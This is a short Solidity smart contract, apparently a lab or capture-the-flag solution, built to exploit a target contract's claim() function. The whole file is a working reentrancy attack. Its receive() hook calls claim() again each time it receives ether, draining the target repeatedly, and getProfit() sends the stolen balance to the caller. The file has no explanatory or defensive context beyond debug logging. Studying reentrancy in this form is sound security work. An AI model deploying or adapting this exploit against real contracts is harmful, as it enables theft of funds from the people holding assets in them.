// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ICrafty {
    function claim() external;
}

contract Abuser {

    address public toAbuse;
    uint public again;

    constructor(address _toAbuse) {
        toAbuse = _toAbuse;
        again = 1;
    }

    receive() external payable {
        toAbuse.call(abi.encodeWithSignature("claim()"));
    }

    function claimMe() public {
        ICrafty(toAbuse).claim();
        console.log("Holding %d", address(this).balance);
    }

    function getProfit() external {
        console.log("Sending %d", address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }
}